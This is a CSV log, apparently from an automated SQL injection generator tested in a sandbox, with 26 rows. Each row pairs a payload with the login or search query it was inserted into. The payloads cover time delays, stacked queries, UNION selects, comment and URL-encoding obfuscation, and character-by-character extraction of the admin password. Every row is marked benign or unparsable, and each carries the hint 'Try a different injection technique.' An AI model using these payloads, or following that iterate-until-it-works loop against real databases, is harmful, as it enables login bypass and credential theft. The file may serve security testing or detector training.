query_id,seed_payload,payload,full_query,attack_category,template_context,failure_stage,failure_reason,codebert_score,mutation_count,hint
q00168,,' AND 1=1; WAITFOR DELAY '0:0:5' UNION SELECT NULL,SELECT * FROM products WHERE name LIKE '%' AND 1=1; WAITFOR DELAY '0:0:5' UNION SELECT NULL%',blind_time,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00204,,"'; UNION ALL SELECT NULL, NULL, NULL, NULL FROM (SELECT 1) AS T --","SELECT * FROM users WHERE username = ''; UNION ALL SELECT NULL, NULL, NULL, NULL FROM (SELECT 1) AS T --' AND password = 'anything'",stacked_queries,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00218,,'; WAITFOR DELAY '0:0:5'; --,SELECT * FROM products WHERE name LIKE '%'; WAITFOR DELAY '0:0:5'; --%',stacked_queries,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00220,,'; IF (SELECT COUNT(*) FROM products) > 0 BEGIN PRINT 'Injection Successful' END; --,SELECT * FROM products WHERE name LIKE '%'; IF (SELECT COUNT(*) FROM products) > 0 BEGIN PRINT 'Injection Successful' END; --%',stacked_queries,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00252,,"' OR username IN ('admin', 'root') /*","SELECT * FROM users WHERE username = '' OR username IN ('admin', 'root') /*' AND password = 'anything'",comment_obfuscation,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00254,,"# Case insensitive comment
SELECT * FROM users WHERE username = 'admin' AND # password = 'admin'","SELECT * FROM users WHERE username = '# Case insensitive comment
SELECT * FROM users WHERE username = 'admin' AND # password = 'admin'' AND password = 'anything'",comment_obfuscation,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00255,,"/**/ Subquery in comment
SELECT * FROM users WHERE username = 'admin' AND (/**/ SELECT COUNT(*) FROM dual ) --","SELECT * FROM users WHERE username = '/**/ Subquery in comment
SELECT * FROM users WHERE username = 'admin' AND (/**/ SELECT COUNT(*) FROM dual ) --' AND password = 'anything'",comment_obfuscation,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00256,,"; Encoding in comment
SELECT * FROM users WHERE username = 'admin' AND password = 'admin'; --","SELECT * FROM users WHERE username = '; Encoding in comment
SELECT * FROM users WHERE username = 'admin' AND password = 'admin'; --' AND password = 'anything'",comment_obfuscation,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00257,,"' OR ""password"" LIKE '--'
SELECT * FROM users WHERE username = 'admin' AND ""password"" LIKE '--'","SELECT * FROM users WHERE username = '' OR ""password"" LIKE '--'
SELECT * FROM users WHERE username = 'admin' AND ""password"" LIKE '--'' AND password = 'anything'",comment_obfuscation,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00261,,1';WAITFOR DELAY '0:0:5'--,SELECT * FROM products WHERE name LIKE '%1';WAITFOR DELAY '0:0:5'--%',comment_obfuscation,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00292,,1%27+LIKE+'a%'+AND+(SELECT+CASE+WHEN+1=1+THEN+CHAR(66)+ELSE+NULL+END+FROM+dual)%2B'a',SELECT * FROM users WHERE username = '1%27+LIKE+'a%'+AND+(SELECT+CASE+WHEN+1=1+THEN+CHAR(66)+ELSE+NULL+END+FROM+dual)%2B'a'' AND password = 'anything',encoding_obfuscation,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00293,,1'%27+OR+EXISTS(SELECT+*+FROM+information_schema.tables+WHERE+table_name=CHAR(0x62)+and+table_schema=database())--,SELECT * FROM users WHERE username = '1'%27+OR+EXISTS(SELECT+*+FROM+information_schema.tables+WHERE+table_name=CHAR(0x62)+and+table_schema=database())--' AND password = 'anything',encoding_obfuscation,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00294,,"1'/*%23*/union%20all%20select%20username,%20password%20from%20users--%23","SELECT * FROM users WHERE username = '1'/*%23*/union%20all%20select%20username,%20password%20from%20users--%23' AND password = 'anything'",encoding_obfuscation,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00295,,1'or%20password%20in(%20(select%20password%20from%20users%20where%20username='admin'))--%23,SELECT * FROM users WHERE username = '1'or%20password%20in(%20(select%20password%20from%20users%20where%20username='admin'))--%23' AND password = 'anything',encoding_obfuscation,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00296,,1'and%20exists(select%20*%20from%20users%20where%20username='admin')--%23,SELECT * FROM users WHERE username = '1'and%20exists(select%20*%20from%20users%20where%20username='admin')--%23' AND password = 'anything',encoding_obfuscation,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00297,,1'and%20password='%23'%'--%23,SELECT * FROM users WHERE username = '1'and%20password='%23'%'--%23' AND password = 'anything',encoding_obfuscation,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00298,,1' + CHAR(0x23) + ' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '%',SELECT * FROM users WHERE username = '1' + CHAR(0x23) + ' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '%'' AND password = 'anything',encoding_obfuscation,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00300,,/*1'*/ WAITFOR DELAY '0:0:5' /*2'*/,SELECT * FROM users WHERE username = '/*1'*/ WAITFOR DELAY '0:0:5' /*2'*/' AND password = 'anything',encoding_obfuscation,login,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00303,,%' OR EXISTS(SELECT*FROM users WHERE username='admin')/*,SELECT * FROM products WHERE name LIKE '%%' OR EXISTS(SELECT*FROM users WHERE username='admin')/*%',encoding_obfuscation,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00307,,"%\' UNION ALL SELECT NULL,NULL,NULL,NULL\""""","SELECT * FROM products WHERE name LIKE '%%\' UNION ALL SELECT NULL,NULL,NULL,NULL\""""%'",encoding_obfuscation,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00308,,"%\' AND WAITFOR DELAY '0:0:5'""","SELECT * FROM products WHERE name LIKE '%%\' AND WAITFOR DELAY '0:0:5'""%'",encoding_obfuscation,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00310,,%25'%20OR%20EXISTS(SELECT%20*%20FROM%20users%20WHERE%20username=%27admin%27)%2F*,SELECT * FROM products WHERE name LIKE '%%25'%20OR%20EXISTS(SELECT%20*%20FROM%20users%20WHERE%20username=%27admin%27)%2F*%',encoding_obfuscation,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00311,,"'%2BCHAR(0x27)%2BAND%20ASCII(SUBSTRING((SELECT%20password%20FROM%20users%20LIMIT%201),%201,%201))%20>%2050--","SELECT * FROM products WHERE name LIKE '%'%2BCHAR(0x27)%2BAND%20ASCII(SUBSTRING((SELECT%20password%20FROM%20users%20LIMIT%201),%201,%201))%20>%2050--%'",encoding_obfuscation,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00347,,'; WAITFOR DELAY '0:0:10' AND (SELECT NULL FROM sysobjects WHERE xtype='U')--,SELECT * FROM products WHERE name LIKE '%'; WAITFOR DELAY '0:0:10' AND (SELECT NULL FROM sysobjects WHERE xtype='U')--%',nested_injection,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00352,,"; WAITFOR DELAY '0:0:5' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(chr(66)||chr(67)||chr(79)||chr(101), 5) FROM DUAL) --","SELECT * FROM products WHERE name LIKE '%; WAITFOR DELAY '0:0:5' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(chr(66)||chr(67)||chr(79)||chr(101), 5) FROM DUAL) --%'",nested_injection,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
q00353,,") OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username = 'admin')) > 64 --","SELECT * FROM products WHERE name LIKE '%) OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username = 'admin')) > 64 --%'",nested_injection,search,sandbox,Sandbox returned benign. Reason: AST validation failed or query did not parse cleanly,0.0,0,The query was classified as benign by the sandbox. Try a different injection technique.
